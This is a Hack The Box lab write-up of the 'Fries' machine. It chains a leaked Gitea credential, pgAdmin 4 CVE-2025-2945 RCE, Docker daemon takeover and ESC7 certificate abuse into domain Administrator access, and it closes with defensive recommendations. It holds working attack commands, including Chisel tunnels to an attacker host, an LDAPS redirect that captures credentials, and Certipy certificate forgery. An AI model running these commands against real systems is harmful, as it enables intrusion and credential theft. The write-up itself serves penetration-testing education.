---
title: "Fries — From a Gitea Credential Leak to ESC7 Domain Compromise"
description: "A provided Gitea login exposes database credentials that yield pgAdmin 4 remote code execution, Docker daemon control, captured domain credentials, and ESC7 certificate abuse on a dual-OS Active Directory lab."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - docker
  - gmsa
objective: "Chain a leaked repository credential, container compromise, and an AD CS misconfiguration into domain-wide administrative access."
tools:
  - rustscan
  - nmap
  - gobuster
  - hydra
  - sshpass
  - chisel
  - openssl
  - docker
  - Responder
  - NetExec
  - Certipy
  - PSPKI
  - certutil
skill: "Multi-stage Active Directory exploitation from containerized service compromise to certificate-authority abuse"
outcome: "Administrator NTLM hash recovery through ESC7 certificate abuse, after Docker daemon control and gMSA credential retrieval."
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory domain controller alongside a Linux host running containerized services (dual-OS) |
| Starting position | Provided Gitea application credentials |
| Objective | Chain a leaked repository credential, container compromise, and an AD CS misconfiguration into domain-wide administrative access |
| Outcome | Administrator NTLM hash recovery through ESC7 certificate abuse |

## From a repository leak to ESC7 abuse

Fries is a Medium-rated Hack The Box Windows Active Directory lab with a dual-OS layout: a Linux host runs SSH, nginx, and containerized services behind the same address that fronts a Windows domain controller. Starting from a provided Gitea login, the path combines a repository credential leak, a container compromise, and an AD CS misconfiguration to reach domain-wide administrative control. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** `Provided Gitea credentials → repository-history database credential leak → pgAdmin 4 CVE-2025-2945 container RCE → environment-variable credential reuse over SSH → NFS export via Chisel → Docker TLS certificates → Docker daemon control → PWM LDAPS redirect and credential capture → gMSA hash retrieval → ESC7 certificate abuse → Administrator`

## A dual-OS lab, container tier, and a web credential

- **Target:** a Windows Active Directory domain controller (Kerberos, LDAP, DNS, SMB, WinRM) and a Linux host (SSH, nginx) sharing one address: an intentionally dual-OS lab.
- **Container services:** five Docker containers form the application tier: Gitea, PostgreSQL, pgAdmin 4, PWM, and a web front end.
- **Starting position:** a provided Gitea account, with no domain credentials.
- **Objective:** move from the provided web credential to domain-wide administrative control by abusing credential reuse, container orchestration, and a certificate-authority misconfiguration.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: Gitea leak to container and CA control

### 1. Service and Virtual Host Enumeration

Observation: a full TCP scan returns both Linux and Windows services on one address, and the Kerberos port confirms a domain controller.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/Fries-TCP
echo '<TARGET_IP> <DOMAIN_CONTROLLER_HOST> <TARGET_DOMAIN>' | sudo tee -a /etc/hosts
gobuster vhost --url http://<TARGET_DOMAIN> --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Truncated scan output:

```text
22/tcp    open  ssh          OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
88/tcp    open  kerberos-sec Microsoft Windows Kerberos
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

```text
Found: <SOURCE_CONTROL_HOST> Status: 200 [Size: 13591]
```

Significance: the SSH/nginx services indicate a Linux host, while Kerberos, LDAP, and WinRM indicate a domain controller; virtual-host discovery exposes an otherwise unreachable Gitea web application at `<SOURCE_CONTROL_HOST>`.

Result: the scan confirms the dual-OS architecture and identifies a Gitea instance for review.

### 2. Repository Credential Leak and pgAdmin 4 CVE-2025-2945 RCE

Observation: repository history exposes a `.env` file with a database connection string, and a repository comment names an internal database management interface.

```text
DATABASE_URL: <DATABASE_USER>:<DATABASE_PASSWORD>@<DATABASE_HOST>:5432
```

The referenced panel runs pgAdmin 4 version 9.1, which is vulnerable to CVE-2025-2945 (fixed in 9.2). The exploit uses the provided Gitea credential together with the leaked database credential.

```bash
python3 poc.py \
  --target-url http://<DATABASE_MANAGEMENT_HOST> \
  --username <SOURCE_CONTROL_USER>@<TARGET_DOMAIN> \
  --password '<GITEA_PASSWORD>' \
  --db-user <DATABASE_USER> \
  --db-pass '<DATABASE_PASSWORD>' \
  --db-name <DATABASE_NAME> \
  --payload "<SANITIZED_PAYLOAD>"
```

A shell returns inside the pgAdmin container, and its environment exposes a default password that is reused elsewhere:

```text
<CONTAINER_ID>:/pgadmin4$
```

```text
PGADMIN_DEFAULT_EMAIL=admin@<TARGET_DOMAIN>
PGADMIN_DEFAULT_PASSWORD=<REUSED_PASSWORD>
```

Significance: the vulnerability passes an unsafely handled parameter to Python `eval()`, so an authenticated request becomes code execution under the pgAdmin process. The leaked `.env` value supplies the database credential the exploit path needs, and the container environment discloses a reusable service password.

Result: code execution is obtained inside the pgAdmin container, and an additional reusable credential is recovered.

### 3. SSH Access via Credential Reuse

Observation: the password exposed in the pgAdmin container environment is reused on the host.

```bash
sshpass -p '<REUSED_PASSWORD>' ssh -o PreferredAuthentications=password <SERVICE_USER>@<TARGET_IP>
```

In a separate run, I checked the same password against SSH, and it returned a valid hit for the service account:

```text
[22][ssh] host: <TARGET_IP>  login: <SERVICE_USER>  password: <REUSED_PASSWORD>
```

Significance: the same secret crosses from a containerized management service to host SSH, so a container-level disclosure becomes host-level access without any further exploit.

Result: an authenticated, interactive shell is obtained on the Linux host as `<SERVICE_USER>`.

### 4. NFS Share Mount via Chisel Tunnel

Observation: NFS exports are reachable from Docker internal networks but not directly from the attack machine, so the port is tunnelled back with Chisel.

```bash
./chisel client <ATTACKER_HOST>:<CHISEL_PORT> R:2049:<DOCKER_GATEWAY_IP>:2049
sudo mount -t nfs 127.0.0.1:/ /mnt/<NFS_MOUNT> -o nolock
```

The export enforces access with a numeric GID, so I created a matching local group to read it:

```bash
sudo groupadd -g <NFS_GID> nfs_temp
sudo usermod -a -G <NFS_GID> $USER
newgrp nfs_temp
cp /mnt/<NFS_MOUNT>/srv/<WEB_HOST>/certs/* ~/<CERTS_DIR>/
```

```text
ca-key.pem
ca.pem
server-cert.pem
server.csr
server-key.pem
server-openssl.cnf
```

Significance: the export is restricted only by a bare GID, so any user who can assume that group reads the directory. It contains the Docker TLS certificate material, including the CA private key, which is the trust anchor for the daemon.

Result: the Docker TLS certificate set, including `ca-key.pem`, is extracted.

### 5. Docker Daemon Abuse

Observation: Docker runs with TLS verification on the host's loopback interface, and the tunnelled API plus the extracted CA key allow a client certificate to be minted.

```bash
./chisel client <ATTACKER_HOST>:<CHISEL_PORT> R:2376:<DOCKER_GATEWAY_IP>:2376
openssl genrsa -out sysadm-key.pem 4096
openssl req -new -key sysadm-key.pem -out sysadm.csr -subj '/CN=root'
openssl x509 -req -in sysadm.csr -CA ca.pem -CAkey ca-key.pem -CAcreateserial -out sysadm-cert.pem -days 365 -sha256
docker --tlsverify --tlscacert=ca.pem --tlscert=sysadm-cert.pem --tlskey=sysadm-key.pem -H=127.0.0.1:2376 ps
```

```text
<CONTAINER_ID>   pwm/pwm-webapp:latest
<CONTAINER_ID>   dpage/pgadmin4:9.1.0
<CONTAINER_ID>   <WEB_CONTAINER>
<CONTAINER_ID>   postgres:16
<CONTAINER_ID>   gitea/gitea:1.22.6
```

Significance: the CA key is the trust anchor for the daemon, so a self-signed client certificate is accepted without any daemon configuration change. Daemon control means arbitrary container creation and command execution on the host.

Result: the Docker API authenticates the minted certificate, and the five running containers are enumerated.

### 6. PWM LDAPS Redirect and Credential Capture

Observation: a shell is opened in the PWM container, whose configuration points its directory lookup at the domain controller over LDAPS.

```bash
docker --tlsverify --tlscacert=ca.pem --tlscert=sysadm-cert.pem --tlskey=sysadm-key.pem -H=127.0.0.1:2376 exec -it <CONTAINER_ID> /bin/bash
sed -i 's|ldaps://<DOMAIN_CONTROLLER_HOST>:636|ldaps://<ATTACKER_IP>:636|g' PwmConfiguration.xml
sed -i 's|<property key="configIsEditable"> *true *</property>|<property key="configIsEditable">false</property>|g' PwmConfiguration.xml
```

With a listener running and the container restarted, the LDAP bind is captured in cleartext:

```bash
sudo responder -I <ATTACK_INTERFACE>
docker --tlsverify --tlscacert=ca.pem --tlscert=sysadm-cert.pem --tlskey=sysadm-key.pem -H=127.0.0.1:2376 restart <CONTAINER_ID>
```

```text
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : CN=<INFRASTRUCTURE_SERVICE_ACCOUNT>,CN=Users,<DOMAIN_DN>
[LDAP] Cleartext Password : <INFRASTRUCTURE_SERVICE_PASSWORD>
```

The captured credentials are confirmed against the domain controller:

```text
LDAP  <TARGET_IP>  389  <DOMAIN_CONTROLLER_HOST>  [+] <TARGET_DOMAIN>\<INFRASTRUCTURE_SERVICE_ACCOUNT>:<INFRASTRUCTURE_SERVICE_PASSWORD>
```

Significance: redirecting the application's directory endpoint to an attacker-controlled listener captures a cleartext bind, and disabling the in-application editor prevents the change from being reverted before the service restarts. The captured account is a distinct identity from the host service account.

Result: a domain credential for `<INFRASTRUCTURE_SERVICE_ACCOUNT>` is captured and validated.

### 7. gMSA Credential Retrieval

Observation: the captured account holds read permission on a group Managed Service Account used by the certificate authority.

```bash
nxc ldap <TARGET_DOMAIN> -u <INFRASTRUCTURE_SERVICE_ACCOUNT> -p '<INFRASTRUCTURE_SERVICE_PASSWORD>' -M get-desc-users
nxc ldap <TARGET_DOMAIN> -u <INFRASTRUCTURE_SERVICE_ACCOUNT> -p '<INFRASTRUCTURE_SERVICE_PASSWORD>' --gmsa
```

```text
GET-DESC... User: <GMSA_ACCOUNT>  description: GroupManagedServiceAccount used for Certification Authority operations
```

```text
LDAP  <TARGET_IP>  389  <DOMAIN_CONTROLLER_HOST>  Account: <GMSA_ACCOUNT>  NTLM: <GMSA_NTLM_HASH>  PrincipalsAllowedToReadPassword: <INFRASTRUCTURE_SERVICE_ACCOUNT>
```

Significance: a gMSA password is readable by any principal named in `PrincipalsAllowedToReadPassword`, so the captured account can retrieve the managed account's NTLM hash directly rather than by cracking.

Result: the NTLM hash of the certificate-authority service account is recovered.

### 8. ESC7 Certificate Abuse

Observation: certificate-authority enumeration reports ESC7 (insecure delegated security roles), with `BUILTIN\Administrators` as owner.

```text
Vulnerabilities
      ESC7 : The CA has insecure delegated security roles or permissions.
    CA Permissions
      Owner: BUILTIN\Administrators  <ADMIN_GROUP_SID>
```

The CA's `EditFlags` are modified through the PSPKI module to permit SAN specification, and the CA service is restarted:

```powershell
Import-Module PSPKI
$configReader = New-Object SysadminsLV.PKI.Dcom.Implementations.CertSrvRegManagerD "<CA_FQDN>"
$configReader.SetRootNode($true)
$configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
$configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
Restart-Service certsvc
```

The `EditFlags` change is recorded as applied, but I could not verify it: the verification command's output was not retained:

```powershell
certutil.exe -config "<CA_FQDN>\<CA_NAME>" -getreg "policy\EditFlags"
```

The Administrator SID is retrieved for the certificate request:

```powershell
Get-ADUser administrator -Properties SID | Select-Object -ExpandProperty SID
```

A certificate request then targets the Administrator identity using the `User` template with an explicit UPN and SID, and authentication with the resulting certificate returns the Administrator hash:

```bash
certipy req -u '<INFRASTRUCTURE_SERVICE_ACCOUNT>@<TARGET_DOMAIN>' -p '<INFRASTRUCTURE_SERVICE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -template 'User' -upn 'administrator@<TARGET_DOMAIN>' -sid '<ADMIN_SID>' -dynamic-endpoint
certipy auth -pfx administrator.pfx -dc-ip <TARGET_IP>
```

```text
NTLM hash: <ADMIN_NTLM_HASH>
```

Significance: ESC7 grants effective control over the CA's security descriptors, and editing `EditFlags` exposes ESC6-style behavior so a requester can place an arbitrary SAN on the issued certificate. That yields a certificate for the Administrator identity, and certificate-based PKINIT authentication returns the account's NTLM hash.

Result: certificate authentication for the Administrator identity succeeds and returns the Administrator NTLM hash.

## Challenges: internal ports, NFS GID, config revert, and SAN

| Challenge | Decision | Rationale |
|---|---|---|
| Docker and NFS services bound to internal or loopback addresses | Reached through a Chisel reverse tunnel (`R:` remotes) | The services are not directly routable from the attack machine |
| NFS export restricted by an unlisted numeric GID | Created a matching local group and entered it with `newgrp` | The export authorizes the GID, not a username |
| PWM configurable by design, so the LDAPS edit could revert | Disabled the configuration editor alongside the URL change | Prevents the modification from being restored before the service reloads |
| ESC7 alone does not permit SAN control | Edited `EditFlags` to expose ESC6-style behavior | Needed to place an arbitrary SAN on the requested certificate |

## Outcome: Administrator hash through ESC7 certificate abuse

The path runs from a provided web application credential to Administrator-equivalent control of the domain, built on credential reuse across services and multiple misconfigurations rather than one critical exploit; CVE-2025-2945 is the only software vulnerability in the path.

Limitations: the recovered secret values, the domain SID, and the hash outputs are redacted here, so the credential values themselves are not reproducible from this writeup. The exploit payload appears only as a summary.

## Recommendations: repo secrets, reuse, Docker keys, gMSA, and ESC7

These are recommendations only, with no validation documented.

1. **Secrets in repository history.** A committed `.env` file exposed a database connection string, which fed the pgAdmin exploit. *Recommendation:* keep secrets out of version control, rotate any credential that has ever been committed, and scan history and history rewrites with a secret scanner. *Detection:* scan commits for credential-shaped strings and monitor access to management panels by database-superuser accounts.
2. **Unpatched management interface.** The exposed pgAdmin 4 panel ran a version with a known remote code execution flaw. *Recommendation:* track and promptly apply upstream releases for internet- or network-reachable management tooling, and place such interfaces behind authentication and network segmentation rather than exposing them on an internal hostname. *Detection:* inventory management-service versions and detect unexpected outbound connections from containerized services.
3. **Credential reuse across trust boundaries.** A container's default password authenticated to host SSH. *Recommendation:* never reuse secrets between containers, services, and host accounts; issue unique, rotated credentials per service. *Detection:* monitor successful authentication by a service account from an unexpected source.
4. **Exposed Docker TLS key material.** Docker CA and server keys were readable on an NFS export restricted only by a bare GID. *Recommendation:* keep daemon key material off shared exports, restrict exports by host and user where the protocol supports it, and treat the CA private key as a root-equivalent secret. *Detection:* monitor access to certificate directories and detect unexpected client certificates presented to the daemon.
5. **Attack-controlled directory redirection.** The PWM container's LDAP endpoint was repointed to capture a cleartext bind. *Recommendation:* enforce TLS certificate validation on directory clients, protect application configuration files from in-container modification, and remove cleartext bind usage. *Detection:* monitor configuration changes to authentication endpoints and on cleartext LDAP binds.
6. **Over-broad gMSA read permission.** `<INFRASTRUCTURE_SERVICE_ACCOUNT>` could read the CA gMSA's password. *Recommendation:* review `PrincipalsAllowedToReadPassword` regularly and limit it to the minimum set of identities that require it. *Detection:* monitor gMSA password reads and changes to those ACLs.
7. **CA delegation misconfiguration (ESC7).** Insecure delegated security roles let the attacker edit `EditFlags` and expose ESC6-style SAN control. *Recommendation:* audit CA security descriptors and policy flags against a hardened baseline, restrict CA management to dedicated tier-zero identities, and monitor `EditFlags` and policy-module changes. *Validation:* periodically enumerate CA misconfigurations with a tool such as Certipy and review the results.

## References

- [Hack The Box — Fries](https://app.hackthebox.com/machines/Fries) (retired machine)
- [NVD — CVE-2025-2945](https://nvd.nist.gov/vuln/detail/CVE-2025-2945) (pgAdmin 4 remote code execution, fixed in 9.2)
- [pgAdmin — Security Advisories](https://www.pgadmin.org/security/) (vendor advisory listing for CVE-2025-2945)
- [GitHub Advisory — GHSA-g73c-fw68-pwx3](https://github.com/advisories/GHSA-g73c-fw68-pwx3) (pgAdmin 4 remote code execution)
- [pgAdmin4 issue 8603](https://github.com/pgadmin-org/pgadmin4/issues/8603) (upstream fix reference)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster](https://github.com/OJ/gobuster) (directory, DNS, and virtual-host discovery)
- [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra) (credential checks against network services)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
- [Chisel](https://github.com/jpillora/chisel) (TCP tunnel over HTTP)
- [OpenSSL `x509`](https://docs.openssl.org/master/man1/openssl-x509/) (certificate request signing)
- [Docker — Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/) (TLS client authentication)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server, including LDAP capture)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (LDAP and gMSA operations)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse)
- [PSPKI](https://github.com/Crypt32/PSPKI) (PowerShell PKI/CA management module)
- [certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) (Windows certificate and CA utility)
